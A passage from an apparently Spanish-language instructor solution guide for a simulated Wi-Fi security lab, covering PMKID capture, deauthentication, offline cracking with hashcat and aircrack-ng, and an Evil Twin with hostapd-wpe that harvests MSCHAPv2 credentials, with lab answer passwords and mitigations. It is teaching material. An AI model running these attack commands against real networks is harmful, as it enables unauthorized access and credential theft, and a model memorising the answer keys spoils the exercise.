+hcxhashtool -i pmkid_cli.22000 --essid=he_pmkid -o solo_pmkid.22000
+
+grep -c <span class="hljs-string">'^WPA\*01'</span> solo_pmkid.22000   <span class="hljs-comment"># PMKID</span>
+grep -c <span class="hljs-string">'^WPA\*02'</span> solo_pmkid.22000   <span class="hljs-comment"># handshake (M1+M2)</span>
+</div></code></pre>
+<p>En el resumen de hcxpcapngtool:</p>
+<ul>
+<li><code>RSN PMKID written to 22000 hash file</code>: PMKID.</li>
+<li><code>EAPOL pairs written to 22000 hash file</code>: handshakes.</li>
+<li><code>EAPOL ROGUE pairs</code>: handshakes obtenidos haciéndose pasar por el AP.</li>
+<li><code>MAC ACCESS POINT ... (incremented on every new client)</code>: el AP falso del
+propio hcxdumptool, no el del lab.</li>
+</ul>
+<p>Cada línea 22000 tiene el formato
+<code>WPA*&lt;tipo&gt;*&lt;PMKID o MIC&gt;*&lt;MAC_AP&gt;*&lt;MAC_STA&gt;*&lt;ESSID en hex&gt;*...</code>.</p>
+<h3 id="c-crackear">c) Crackear</h3>
+<pre class="hljs"><code><div>hashcat -m 22000 solo_pmkid.22000 /usr/share/wordlists/rockyou.txt
+hashcat -m 22000 solo_pmkid.22000 --show
+</div></code></pre>
+<p>hashcat informa de <code>2 digests; 2 unique digests, 1 unique salts</code>: son dos
+hashes (PMKID y handshake) de la misma red, y el <em>salt</em> común es el ESSID.
+Los dos salen con la misma clave (<code>Recovered: 2/2</code>).</p>
+<p>Para demostrar que cada vía funciona por separado:</p>
+<pre class="hljs"><code><div>hcxhashtool -i solo_pmkid.22000 --<span class="hljs-built_in">type</span>=1 -o solo_pmkid_01.22000   <span class="hljs-comment"># solo PMKID</span>
+hcxhashtool -i solo_pmkid.22000 --<span class="hljs-built_in">type</span>=2 -o solo_pmkid_02.22000   <span class="hljs-comment"># solo handshake</span>
+</div></code></pre>
+<p><strong>Resultado esperado:</strong> <code>butterfly</code>.</p>
+<p><strong>Problema frecuente: hashcat termina sin probar nada</strong> y muestra
+<code>Not enough allocatable device memory or free host memory for mapping</code>. La VM
+tiene poca RAM: PoCL solo deja reservar la mitad (por ejemplo <code>738/1477 MB</code>).
+Lo mejor es darle 4 GB a la VM. Si no es posible, reduce la carga:</p>
+<pre class="hljs"><code><div>hashcat -m 22000 solo_pmkid.22000 /usr/share/wordlists/rockyou.txt -n 1 -u 1 -T 1 -w 1
+</div></code></pre>
+<p>Si se prueba con un diccionario propio, comprueba que contiene la clave.
+hashcat no avisa: simplemente termina como <code>Exhausted</code>.</p>
+<h3 id="d-via-alternativa-con-la-suite-aircrack-ng">d) Vía alternativa con la suite aircrack-ng</h3>
+<p>El mismo escenario se resuelve solo con la suite aircrack-ng, sin hcxtools.
+Como hay un cliente asociado, se aprovecha un <strong>deauth</strong> para forzar su
+reasociación: el AP responde con un M1 que (en este lab, con el hostapd
+parcheado) lleva el <strong>PMKID</strong>, y acto seguido se completa el <strong>handshake
+4-way</strong>. airodump-ng guarda ambos en el mismo <code>.cap</code>.</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Monitor y localización</span>
+sudo airmon-ng start wlan0               <span class="hljs-comment"># -&gt; wlan0mon</span>
+sudo airodump-ng wlan0mon --band g       <span class="hljs-comment"># he_pmkid: CH 11, con una estación</span>
+
+<span class="hljs-comment"># Capturar fijando canal y BSSID (anota la MAC del cliente en STATION)</span>
+BSSID=&lt;BSSID_PMKID&gt;
+sudo airodump-ng -c 11 --bssid <span class="hljs-variable">$BSSID</span> -w cap_pmkid wlan0mon
+</div></code></pre>
+<p>airodump-ng captura de forma <strong>pasiva</strong>. Si el cliente ya estaba asociado
+antes de empezar, puede que no se vea aún ni el handshake ni el PMKID: hay que
+provocar una reconexión.</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Desde otra terminal: deauth dirigido al cliente (-c) o a todos</span>
+CLIENT=&lt;MAC_CLIENTE&gt;
+sudo aireplay-ng -0 3 -a <span class="hljs-variable">$BSSID</span> -c <span class="hljs-variable">$CLIENT</span> wlan0mon
+</div></code></pre>
+<p>Al reconectarse el cliente, airodump-ng muestra arriba a la derecha
+<code>WPA handshake: &lt;BSSID&gt;</code>; las versiones recientes también anuncian el PMKID
+con un <code>PMKID found</code>. Con cualquiera de los dos ya se puede crackear:</p>
+<pre class="hljs"><code><div>aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <span class="hljs-variable">$BSSID</span> cap_pmkid-01.cap
+</div></code></pre>
+<p>aircrack-ng (desde la 1.4) lee el PMKID del M1 <strong>y</strong> el MIC del handshake. En
+el encabezado indica qué material tiene, por ejemplo
+<code>1 handshake, with PMKID</code>. Si solo quieres convertirlo al formato de hashcat,
+sirve el mismo <code>hcxpcapngtool -o hash.22000 cap_pmkid-01.cap</code> de la sección 3.</p>
+<p><strong>Resultado esperado:</strong> <code>butterfly</code>.</p>
+<p><strong>Diferencia con hcxtools.</strong> hcxdumptool consigue el PMKID <strong>activamente</strong>:
+se asocia él mismo con una MAC inventada y le basta el M1 del AP (por eso en
+<code>he_pmkid_nc</code>, sin clientes, funciona igual). La vía aircrack-ng es <strong>pasiva +
+deauth</strong>: necesita que un cliente legítimo se reasocie para que el AP emita ese
+M1 y para capturar el handshake. Por eso aquí, con cliente, las dos funcionan;
+en <code>he_pmkid_nc</code> solo la primera.</p>
+<h3 id="fundamento-tecnico">Fundamento técnico</h3>
+<ul>
+<li>
+<p><strong>Qué es el PMKID.</strong> Es un identificador de la PMK pensado para el <em>roaming</em>
+y la caché de PMK (802.11i/r, OKC). Si el cliente vuelve a un AP que ya
+conoce su PMK, ambos la identifican por el PMKID y se ahorran repetir la
+autenticación completa. El AP lo incluye en el campo <em>Key Data</em> (RSN IE) del
+<strong>M1</strong>:</p>
+<pre class="hljs"><code><div>PMKID = HMAC-SHA1-128(PMK, &quot;PMK Name&quot; ‖ MAC_AP ‖ MAC_STA)
+</div></code></pre>
+</li>
+<li>
+<p><strong>Qué se explota.</strong> Como el MIC del handshake, el PMKID es un <strong>verificador
+de la contraseña</strong> calculado con datos públicos (las dos MACs) y la PMK.
+Para cada candidata se calcula PMK → HMAC y se compara. El coste es el mismo
+que con el handshake (PBKDF2), pero basta <strong>una sola trama (M1)</strong>, enviada
+por el AP, en vez de M1 + M2. Lo descubrió Jens Steube (hashcat) en 2018.</p>
+</li>
+<li>
+<p><strong>Dos vías en este escenario.</strong> Hay un cliente asociado, así que se puede
+conseguir el PMKID (asociándose uno mismo) o el handshake (deauth al
+cliente). hashcat las distingue en el formato 22000: <code>WPA*01</code> = PMKID,
+<code>WPA*02</code> = handshake.</p>
+<ul>
+<li>Para el <strong>PMKID</strong> basta con el M1 del AP. Lo calcula el AP con la PMK
+real, sin importar quién se asocie.</li>
+<li>Para el <strong>handshake</strong> hacen falta M1 y M2. El MIC del M2 solo vale como
+verificador si lo calcula alguien que conoce la clave, es decir, el
+cliente legítimo. Por eso esta vía necesita un cliente y la del PMKID no.</li>
+</ul>
+</li>
+<li>
+<p><strong>Ruido.</strong> La vía del PMKID es sigilosa: solo hay una asociación del
+atacante. La del handshake obliga a desconectar al cliente, que lo nota
+como un corte breve y queda registrado en el AP.</p>
+</li>
+<li>
+<p><strong>Nota del lab:</strong> el hostapd de serie no incluye el PMKID en el M1 con
+WPA-PSK. Por eso los escenarios PMKID usan un hostapd parcheado
+(<code>compila_hostapd_pmkid.sh</code>), que reproduce el comportamiento de muchos
+routers comerciales.</p>
+</li>
+</ul>
+<hr>
+<h2 id="5-he-pmkid-nc-pmkid-sin-clientes-clientless">5. <code>he_pmkid_nc</code> — PMKID <strong>sin</strong> clientes (<em>clientless</em>)</h2>
+<p>No hay ninguna estación asociada <strong>a propósito</strong>. Es el caso que demuestra por
+qué el PMKID es peligroso: el AP incluye el PMKID en el <strong>primer mensaje (M1)</strong>
+del 4-way durante la asociación, así que <strong>no hace falta ningún cliente</strong>:
+basta con provocar uno mismo la asociación para que el AP emita ese M1.</p>
+<p>Hay dos formas de provocar esa asociación. Las dos terminan igual:
+<code>hcxpcapngtool</code> extrae el PMKID (línea <code>WPA*01</code>) y <code>hashcat -m 22000</code> lo
+crackea.</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Localizar el objetivo</span>
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon --band g       <span class="hljs-comment"># he_pmkid_nc: CH 4, sin estaciones</span>
+BSSID=&lt;BSSID_PMKID_NC&gt;
+</div></code></pre>
+<h3 id="metodo-a-hcxdumptool-ataque-clientless-real">Método A: hcxdumptool (ataque <em>clientless</em> &quot;real&quot;)</h3>
+<p>hcxdumptool se hace pasar por un cliente con una MAC inventada, se autentica y
+se asocia con el AP, y guarda el M1 que este le envía.</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Interfaz limpia: hcxdumptool la pone en monitor él solo</span>
+sudo hcxdumptool -i wlan1 -c 4a -w pmkid_nc.pcapng --rds=1
+<span class="hljs-comment">#   -c 4a es imprescindible: por defecto solo salta por los canales 1, 6 y 11</span>
+<span class="hljs-comment">#   (la "a" indica la banda de 2,4 GHz). Sintaxis de la 6.3 y posteriores.</span>
+<span class="hljs-comment">#   Esperar a que la fila de he_pmkid_nc muestre "+" en la columna P y pulsar Ctrl+C.</span>
+
+hcxpcapngtool -o pmkid_nc.22000 pmkid_nc.pcapng   <span class="hljs-comment"># debe escribir una línea WPA*01</span>
+hashcat -m 22000 pmkid_nc.22000 /usr/share/wordlists/rockyou.txt
+hashcat -m 22000 pmkid_nc.22000 --show
+</div></code></pre>
+<p>En la pantalla de hcxdumptool, las columnas <code>E A 1 2 3 P</code> de cada AP se marcan
+con <code>+</code>. Lo normal en este escenario es ver <code>+</code> en <code>E</code>, <code>A</code>, <code>1</code> y <code>P</code>, y nada
+en <code>2</code> ni en <code>3</code> (no hay clientes). Si <code>A</code> se queda en blanco, la asociación no
+se completa (ver más abajo: hostapd sin recompilar). Si <code>1</code> tiene <code>+</code> pero <code>P</code>
+no, el AP envía el M1 sin PMKID.</p>
+<p><strong>Requiere el hostapd recompilado con el parche del ACK.</strong> Si
+<code>/usr/local/sbin/hostapd-pmkid</code> es anterior a ese parche:</p>
+<pre class="hljs"><code><div>sudo ./limpia.sh
+sudo ./compila_hostapd_pmkid.sh --force    <span class="hljs-comment"># deben salir DOS "[OK] Parche aplicado"</span>
+sudo ./despliegue.sh
+</div></code></pre>
+<h3 id="metodo-b-wpa-supplicant-con-una-contrasena-falsa">Método B: <code>wpa_supplicant</code> con una contraseña falsa</h3>
+<p>El atacante se asocia como un cliente normal, con una contraseña cualquiera.
+El AP envía el M1 con el PMKID <strong>antes</strong> de comprobar nada. No necesita el
+hostapd recompilado con el parche del ACK.</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># wlan1 en modo managed (si hcxdumptool la dejó en monitor)</span>
+sudo ip link <span class="hljs-built_in">set</span> wlan1 down; sudo iw dev wlan1 <span class="hljs-built_in">set</span> <span class="hljs-built_in">type</span> managed; sudo ip link <span class="hljs-built_in">set</span> wlan1 up
+
+<span class="hljs-comment"># Terminal 1: capturar en el canal 4</span>
+sudo airodump-ng -c 4 --bssid <span class="hljs-variable">$BSSID</span> -w pmkid_nc wlan0mon
+
+<span class="hljs-comment"># Terminal 2: asociarse con una contraseña falsa</span>
+wpa_passphrase he_pmkid_nc contrasenafalsa &gt; falso.conf
+sudo wpa_supplicant -D nl80211 -i wlan1 -c falso.conf
+<span class="hljs-comment">#   ~10 s: saldrán errores de 4-way handshake (clave incorrecta). Ctrl+C</span>
+
+<span class="hljs-comment"># Extraer SOLO el PMKID y crackear</span>
+hcxpcapngtool -o todo.22000 pmkid_nc-01.cap
+grep <span class="hljs-string">'WPA\*01'</span> todo.22000 &gt; pmkid_nc.22000
+hashcat -m 22000 pmkid_nc.22000 /usr/share/wordlists/rockyou.txt
+</div></code></pre>
+<p>El <code>grep</code> es necesario: la captura también contiene el M2 que ha enviado
+<code>wpa_supplicant</code>, calculado con la contraseña falsa. hcxpcapngtool lo saca como
+<code>WPA*02</code>, y esa línea no tiene sentido crackearla.</p>
+<p><strong>Resultado esperado (ambos métodos):</strong> <code>football</code>.</p>
+<h3 id="por-que-hubo-que-recompilar-hostapd-para-el-metodo-a">Por qué hubo que recompilar hostapd para el método A</h3>
+<p><code>compila_hostapd_pmkid.sh</code> aplica <strong>dos</strong> parches a hostapd 2.10. Los dos
+afectan solo al binario <code>hostapd-pmkid</code> (escenarios <code>he_pmkid</code> y
+<code>he_pmkid_nc</code>); el resto de escenarios usa el hostapd del sistema.</p>
+<ol>
+<li><strong>PMKID en el M1 con WPA-PSK</strong> (<code>src/ap/wpa_auth.c</code>). El hostapd de serie
+solo incluye el PMKID en el M1 con 802.1X, SAE u OWE. Sin este parche no
+hay PMKID que capturar con ningún método. Reproduce el comportamiento de
+muchos routers comerciales.</li>
+<li><strong>No exigir el ACK de la <em>Authentication/Association Response</em></strong>
+(<code>src/ap/ieee802_11.c</code>, <code>handle_auth_cb</code> y <code>handle_assoc_cb</code>). En 802.11 el
+receptor de cada trama unicast la confirma con un ACK, y hostapd descarta a
+la estación si no recibe el ACK de esas dos respuestas. En
+<code>mac80211_hwsim</code> solo envían ACK las interfaces &quot;activas&quot; (managed, AP...).
+La MAC inventada que inyecta hcxdumptool desde modo monitor no pertenece a
+ninguna, así que nadie confirma las respuestas del AP. hostapd da la
+asociación por fallida y <strong>nunca envía el M1</strong>.</li>
+</ol>
+<p>Síntoma sin el parche 2: la captura de hcxdumptool solo tiene un beacon y una
+<em>probe response</em>, y hcxpcapngtool avisa de que faltan tramas de autenticación y
+asociación (<code>no hashes written</code>). Para comprobarlo en directo:</p>
+<pre class="hljs"><code><div>sudo iw dev wlan0mon <span class="hljs-built_in">set</span> channel 4
+sudo tcpdump -i wlan0mon -e -n <span class="hljs-string">"wlan addr3 <span class="hljs-variable">$BSSID</span> and not subtype beacon"</span>
+<span class="hljs-comment"># Se ve Authentication/Association, pero ninguna trama EAPOL del AP</span>
+</div></code></pre>
+<p>El parche 2 solo cambia qué hace hostapd cuando <strong>falta</strong> el ACK. Los
+clientes legítimos y el método B (<code>wlan1</code> en managed) sí envían el ACK, así que
+siguen funcionando igual. El único efecto secundario es que cada intento de
+hcxdumptool deja una estación &quot;fantasma&quot; hasta que caduca por inactividad
+(unos 5 minutos).</p>
+<p>Es la misma limitación que impide el fake auth (<code>aireplay-ng -1</code>) en el
+escenario WEP.</p>
+<p><strong>Comparación (respuesta a la pregunta de la guía del alumno):</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th><code>he_pmkid</code></th>
+<th><code>he_pmkid_nc</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Cliente conectado</td>
+<td>Sí</td>
+<td>No</td>
+</tr>
+<tr>
+<td>¿Hace falta esperar/deauth a un cliente?</td>
+<td>Opcional</td>
+<td><strong>No</strong></td>
+</tr>
+<tr>
+<td>Material obtenible</td>
+<td>PMKID <strong>y</strong> handshake</td>
+<td>Solo PMKID</td>
+</tr>
+<tr>
+<td>Lección</td>
+<td>Dos vías de ataque</td>
+<td>El PMKID no depende de clientes</td>
+</tr>
+</tbody>
+</table>
+<h3 id="fundamento-tecnico">Fundamento técnico</h3>
+<ul>
+<li>Se aplica la misma fórmula que en el escenario anterior:
+<code>PMKID = HMAC-SHA1-128(PMK, &quot;PMK Name&quot; ‖ MAC_AP ‖ MAC_STA)</code>. Con PSK, la
+<code>MAC_STA</code> puede ser <strong>la del atacante</strong>: el PMKID no depende de ningún
+cliente legítimo. Cualquiera que se asocie recibe un M1 con un PMKID válido
+para su propia MAC.</li>
+<li><strong>Qué se explota.</strong> El AP envía el M1 <strong>antes</strong> de que el cliente haya
+demostrado conocer la clave: el atacante no necesita la contraseña para
+provocarlo. En el 4-way, quien demuestra conocer la clave es el cliente, con
+el MIC del M2. Pero el PMKID ya va en el M1, que el AP envía sin verificación
+previa. Por eso el ataque es <em>clientless</em> y más sigiloso: no hay deauth ni
+hay que esperar a nadie.
+<ul>
+<li>Con hcxdumptool (método A) el atacante ni siquiera envía un M2.</li>
+<li>Con <code>wpa_supplicant</code> (método B) se envía un M2 con una contraseña falsa,
+pero da igual: el PMKID del M1 ya está capturado.</li>
+</ul>
+</li>
+<li><strong>Por qué sirve para crackear.</strong> Todo lo que entra en la fórmula salvo la PMK
+es público: &quot;PMK Name&quot; es una constante, la MAC del AP sale en el beacon y la
+MAC de la estación la elige el atacante. Para cada contraseña candidata:
+<code>PMK = PBKDF2(candidata, SSID, 4096)</code> → <code>HMAC-SHA1-128(PMK, …)</code>. Si el
+resultado coincide con el PMKID capturado, la contraseña es esa. Es un
+ataque offline de diccionario: solo caen contraseñas débiles.</li>
+<li><strong>Contraste con el handshake clásico.</strong> Sin clientes, el ataque al 4-way es
+imposible, porque nadie genera el M2 con el MIC. Con PMKID, un AP vacío
+sigue siendo atacable.</li>
+<li><strong>Mitigación:</strong> igual que en WPA2-PSK (contraseña robusta, WPA3-SAE) y
+desactivar la caché de PMK / el PMKID en PSK si el fabricante lo permite.</li>
+</ul>
+<hr>
+<h2 id="6-he-enterprise-wpa2-eap-peapmschapv2">6. <code>he_enterprise</code> — WPA2-EAP (PEAP/MSCHAPv2)</h2>
+<p>Hay un cliente conectado con PEAP/MSCHAPv2. El objetivo es <strong>pasivo</strong>: sacar
+de la captura la identidad del usuario, el método EAP y el certificado del
+servidor. El vector de <strong>Evil Twin / RADIUS falso</strong> (<code>hostapd-wpe</code>) se comenta
+en clase, pero no se ejecuta en este escenario.</p>
+<h3 id="como-esta-montado-el-escenario">Cómo está montado el escenario</h3>
+<ul>
+<li><strong>El propio hostapd es el servidor de autenticación</strong> (<code>eap_server=1</code>). No
+hay RADIUS externo. Usa un certificado autofirmado
+(<code>CN=radius.domain.lab</code>), que <code>despliegue.sh</code> genera la primera vez en
+<code>/opt/wifi-lab/enterprise/certs/</code>.</li>
+<li><strong>Sin caché de PMKSA</strong> (<code>disable_pmksa_caching=1</code>). Cada conexión repite
+el EAP completo. Con la caché, el cliente reconectaría solo con el PMKID y
+no se vería ningún intercambio EAP.</li>
+<li><strong>El cliente se reasocia cada 30 s</strong> (<code>wpa_cli reassociate</code>). Así la
+autenticación se repite sola y basta con escuchar: no hace falta deauth.</li>
+<li><strong>El cliente no valida el certificado</strong> (no tiene <code>ca_cert</code>). Es la
+debilidad que se comenta en el fundamento técnico.</li>
+</ul>
+<p>Al desplegar debe salir
+<code>[✓] Cliente he_enterprise autenticado (PEAP/MSCHAPv2)</code>.</p>
+<h3 id="a-capturar">a) Capturar</h3>
+<pre class="hljs"><code><div>sudo airmon-ng start wlan0 3
+sudo airodump-ng -c 3 --bssid &lt;BSSID_ENT&gt; -w cap_ent wlan0mon
+<span class="hljs-comment"># Esperar ~1 min (al menos una reasociación) y Ctrl+C</span>
+</div></code></pre>
+<h3 id="b-identidad-y-metodo-eap">b) Identidad y método EAP</h3>
+<pre class="hljs"><code><div>tshark -r cap_ent-01.cap -Y eap -T fields -e eap.code -e eap.type -e eap.identity
+</div></code></pre>
+<p>Se lee así:</p>
+<table>
+<thead>
+<tr>
+<th><code>eap.code</code></th>
+<th><code>eap.type</code></th>
+<th>Significado</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1 (Request)</td>
+<td>1</td>
+<td>El AP pide la identidad</td>
+</tr>
+<tr>
+<td>2 (Response)</td>
+<td>1</td>
+<td>El cliente responde con <code>student_user@domain.lab</code> <strong>en claro</strong></td>
+</tr>
+<tr>
+<td>1 (Request)</td>
+<td>25</td>
+<td>El servidor propone PEAP (<em>PEAP Start</em>)</td>
+</tr>
+<tr>
+<td>1 / 2</td>
+<td>25</td>
+<td>Túnel TLS: a partir de aquí todo va cifrado</td>
+</tr>
+<tr>
+<td>3 (Success)</td>
+<td></td>
+<td>Autenticación correcta; después viene el 4-way</td>
+</tr>
+</tbody>
+</table>
+<h3 id="c-certificado-del-servidor">c) Certificado del servidor</h3>
+<p>Con TLS 1.2, el certificado del servidor viaja en claro dentro de PEAP:</p>
+<pre class="hljs"><code><div>tshark -r cap_ent-01.cap -Y <span class="hljs-string">"tls.handshake.type == 11"</span> -V | grep -i <span class="hljs-string">"id-at-commonName"</span>
+</div></code></pre>
+<p>Debe aparecer <code>radius.domain.lab</code>. Es lo que debería comprobar el cliente, y
+lo que imitaría un AP falso. Si la línea no sale, la sesión ha usado TLS 1.3,
+que cifra el certificado. No afecta al resultado de la práctica.</p>
+<p><strong>Resultado esperado:</strong> identidad <code>student_user@domain.lab</code> (viaja en claro en
+la fase externa), tipo EAP 25 = PEAP y certificado <code>CN=radius.domain.lab</code>
+autofirmado.</p>
+<p><strong>Si no aparece ningún paquete EAP:</strong> la captura empezó después de una
+reasociación y se cortó antes de la siguiente. Hay que esperar más. También
+puede que el cliente no se haya autenticado al desplegar. Para comprobarlo:</p>
+<pre class="hljs"><code><div>sudo ip netns <span class="hljs-built_in">exec</span> ns_cli_ent wpa_cli -p /var/run/wpa_supplicant_ent -i wlan_cli_ent status | grep -E <span class="hljs-string">"wpa_state|EAP"</span>
+<span class="hljs-comment"># wpa_state=COMPLETED  /  EAP state=SUCCESS  /  selectedMethod=25 (EAP-PEAP)</span>
+</div></code></pre>
+<h3 id="d-metodo-1-suite-aircrack-ng-y-por-que-no-crackea-enterprise">d) Método 1 — suite aircrack-ng (y por qué <strong>no</strong> crackea Enterprise)</h3>
+<p>Es un ejercicio de contraste, no un ataque que funcione. El alumno comprueba
+de primera mano que la vía habitual contra WPA2-PSK aquí no sirve.</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># Capturar el handshake igual que en he_wpa2</span>
+sudo airmon-ng start wlan0 3
+sudo airodump-ng -c 3 --bssid &lt;BSSID_ENT&gt; -w cap_ent wlan0mon
+
+<span class="hljs-comment"># Forzar una reautenticación (opcional: el cliente ya reasocia cada 30 s)</span>
+sudo aireplay-ng -0 3 -a &lt;BSSID_ENT&gt; -c &lt;MAC_CLIENTE&gt; wlan0mon
+
+<span class="hljs-comment"># Intentar crackear el handshake con diccionario</span>
+aircrack-ng -w /usr/share/wordlists/rockyou.txt -b &lt;BSSID_ENT&gt; cap_ent-01.cap
+</div></code></pre>
+<p><strong>Resultado:</strong> aircrack-ng dice <code>got no data packets</code> o prueba claves y
+<strong>nunca acierta</strong>, por mucho diccionario que se le dé. Motivo: en WPA-Enterprise
+la PMK <strong>no</strong> sale de <code>PBKDF2(passphrase, SSID)</code>, sino de la sesión TLS (MSK),
+distinta en cada conexión. No hay una contraseña de red común que adivinar, así
+que el ataque de diccionario al 4-way es inaplicable. La suite aircrack-ng solo
+sirve aquí para la parte pasiva (identidad y tipo EAP del apartado b) y para el
+deauth que alimenta al método 2.</p>
+<h3 id="e-metodo-2-evil-twin-con-hostapd-wpe-radius-falso">e) Método 2 — Evil Twin con <code>hostapd-wpe</code> (RADIUS falso)</h3>
+<p>Es el ataque realista contra PEAP/MSCHAPv2. Se monta un AP gemelo con un RADIUS
+falso que <strong>registra el reto y la respuesta MSCHAPv2</strong> del cliente. Como el
+cliente del lab no valida el certificado del servidor, entrega sus credenciales
+al gemelo. Después se crackean offline.</p>
+<p><code>hostapd-wpe</code> ya se instala con el laboratorio.</p>
+<p><strong>1. Configurar el AP gemelo</strong> (mismo SSID que el objetivo, en otra interfaz):</p>
+<pre class="hljs"><code><div>sudo cp /etc/hostapd-wpe/hostapd-wpe.conf /tmp/et.conf
+sudo sed -i <span class="hljs-string">'s/^interface=.*/interface=wlan1/'</span> /tmp/et.conf
+sudo sed -i <span class="hljs-string">'s/^ssid=.*/ssid=he_enterprise/'</span>   /tmp/et.conf
+sudo sed -i <span class="hljs-string">'s/^channel=.*/channel=3/'</span>         /tmp/et.conf
+</div></code></pre>
+<p><strong>2. Arrancar el gemelo</strong> (deja wlan1 como AP; no hace falta monitor):</p>
+<pre class="hljs"><code><div>sudo hostapd-wpe /tmp/et.conf
+<span class="hljs-comment"># Queda a la escucha. Cada cliente que se autentique deja sus credenciales aquí.</span>
+</div></code></pre>
+<p><strong>3. Empujar al cliente hacia el gemelo</strong> desde otra terminal. Con deauth
+repetido, el cliente pierde el AP real y, al reasociar, puede elegir el gemelo:</p>
+<pre class="hljs"><code><div>sudo airmon-ng start wlan0 3
+sudo aireplay-ng -0 0 -a &lt;BSSID_ENT&gt; -c &lt;MAC_CLIENTE&gt; wlan0mon   <span class="hljs-comment"># Ctrl+C al capturar</span>
+</div></code></pre>
+<p><strong>4. Leer el reto/respuesta.</strong> Cuando el cliente se autentica contra el gemelo,
+<code>hostapd-wpe</code> imprime (y guarda en <code>/etc/hostapd-wpe/hostapd-wpe.log</code>) algo así:</p>
+<pre class="hljs"><code><div>username:    student_user@domain.lab
+challenge:   &lt;16 hex&gt;
+response:    &lt;48 hex&gt;
+jtr NETNTLM: student_user@domain.lab:$NETNTLM$&lt;challenge&gt;$&lt;response&gt;
+hashcat:     &lt;challenge&gt;:&lt;response&gt;
+</div></code></pre>
+<p><strong>5. Crackear offline</strong> el MSCHAPv2 capturado, por cualquiera de las dos vías:</p>
+<pre class="hljs"><code><div><span class="hljs-comment"># asleap con diccionario</span>
+asleap -C &lt;challenge&gt; -R &lt;response&gt; -W /usr/share/wordlists/rockyou.txt
+
+<span class="hljs-comment"># o hashcat modo 5500 (NetNTLMv1 / MSCHAPv2)</span>
+<span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;challenge&gt;:&lt;response&gt;'</span> &gt; ent.hash
+hashcat -m 5500 ent.hash /usr/share/wordlists/rockyou.txt
+</div></code></pre>
+<p><strong>Resultado esperado:</strong> la contraseña de <code>he_enterprise</code> es
+<code>EnterprisePass2026</code>, <strong>elegida a propósito fuera de <code>rockyou.txt</code></strong>. Con el
+diccionario de serie el crackeo <strong>falla</strong>: el objetivo del lab es <em>capturar</em> el
+reto/respuesta, no recuperar la clave. Para ver también el crackeo, añade la
+palabra a un diccionario propio:</p>
+<pre class="hljs"><code><div><span class="hljs-built_in">echo</span> <span class="hljs-string">'EnterprisePass2026'</span> &gt; /tmp/dic_ent.txt
+asleap -C &lt;challenge&gt; -R &lt;response&gt; -W /tmp/dic_ent.txt
+</div></code></pre>
+<p><strong>Recuperar el hash NT aunque la clave no esté en diccionario.</strong> La respuesta
+MSCHAPv2 se puede reducir a un solo DES (2^56) y obtener el hash NT con
+<code>chapcrack</code>, sea cual sea la contraseña. Ese hash sirve para <em>pass-the-hash</em>
+contra otros servicios NTLM, sin conocer la contraseña en claro.</p>
+<p><strong>Notas de laboratorio:</strong></p>
+<ul>
+<li>En <code>mac80211_hwsim</code> todas las radios se oyen con la misma señal, así que el
+cliente puede seguir prefiriendo el AP real. Para forzar la demostración,
+mantén el deauth (<code>aireplay-ng -0 0</code>) o, en un lab aislado, para brevemente el
+AP legítimo: <code>sudo ip netns exec ns_ap_ent pkill hostapd</code>. Vuelve a desplegar
+al terminar.</li>
+<li>Si solo quieres comprobar que el gemelo captura, conéctate tú mismo con un
+cliente de prueba configurado para <code>he_enterprise</code> sin validar certificado.</li>
+<li>El cliente del lab <strong>no</strong> valida el certificado (sin <code>ca_cert</code>): por eso el
+ataque funciona. Con <code>ca_cert</code> fijado y <code>domain_suffix_match</code>, el gemelo
+presentaría un certificado que no es de confianza y el cliente <strong>abortaría</strong>
+antes de enviar nada: es justo la mitigación.</li>
+</ul>
+<h3 id="fundamento-tecnico">Fundamento técnico</h3>
+<ul>
+<li><strong>No hay una clave compartida que crackear.</strong> En 802.1X cada usuario se
+autentica con sus credenciales contra un servidor de autenticación
+(normalmente RADIUS; en el lab, el EAP integrado de hostapd). La PMK se deriva
+de la sesión TLS (MSK) y es distinta para cada usuario y conexión. Capturar
+el handshake 4-way no sirve: la PMK no sale de ninguna contraseña común. Por
+eso el <strong>método 1 (aircrack-ng) no puede crackear la red</strong> y hay que recurrir
+al <strong>método 2 (Evil Twin)</strong>, que ataca a MSCHAPv2 dentro del túnel.</li>
+<li><strong>Fuga 1: la identidad externa.</strong> El <code>EAP-Response/Identity</code> se envía
+<strong>antes</strong> de montar el túnel TLS, así que el usuario viaja en claro. Es lo
+que se obtiene en este lab. Mitigación: identidad externa anónima
+(<code>anonymous@dominio</code>).</li>
+<li><strong>Fuga 2: PEAP depende de que el cliente valide el certificado del
+servidor.</strong> PEAP monta un túnel TLS autenticado solo con el certificado del
+RADIUS, y dentro va MSCHAPv2. Si el cliente no valida el certificado (o el
+usuario acepta el aviso), un <strong>Evil Twin</strong> con <code>hostapd-wpe</code> (RADIUS falso)
+completa el TLS con su propio certificado, y el cliente le entrega el reto y
+la respuesta MSCHAPv2.</li>
+<li><strong>Debilidad de MSCHAPv2.</strong> Hash NT = MD4(UTF-16LE(contraseña)). La respuesta
+se calcula cifrando con DES el reto de 8 bytes con tres trozos de 7 bytes
+del hash NT; el tercero solo tiene 2 bytes reales. Esto permite:
+<ul>
+<li>un ataque de diccionario offline (<code>asleap</code>, <code>hashcat -m 5500</code>);</li>
+<li>reducirlo a <strong>un solo DES</strong> (2^56) y recuperar el hash NT sea cual sea la
+contraseña. Ese hash ya sirve para <em>pass-the-hash</em>.</li>
+</ul>
+</li>
+<li><strong>Mitigación:</strong> forzar la validación del certificado en los clientes (CA
+fijada y nombre del servidor), identidad anónima y, mejor aún, <strong>EAP-TLS</strong>
+con certificado de cliente (sin contraseña que robar).</li>
+</ul>
+<hr>
+<h2 id="mantenimiento-cambiar-las-claves">Mantenimiento: cambiar las claves</h2>
+<ul>
+<li>
+<p><strong>WPA2:</strong> las claves se guardan como PMK (64 hex) en <code>despliegue.sh</code>, en el
+<code>hostapd.conf</code> y en el <code>wpa.conf</code> de cada escenario. La PMK depende del SSID,
+así que se calcula para cada red:</p>
